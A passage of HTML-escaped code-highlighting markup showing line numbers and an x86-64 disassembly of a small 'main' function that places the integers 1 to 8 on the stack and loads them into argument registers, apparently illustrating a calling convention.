class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0000000000001149 &amp;lt;main&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1149:       f3 0f 1e fa             endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    114d:       55                      push   rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    114e:       48 89 e5                mov    rbp,rsp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1151:       48 83 ec 20             sub    rsp,0x20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    115c:       c7 45 e4 02 00 00 00    mov    DWORD PTR [rbp-0x1c],0x2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]&lt;/span&gt;&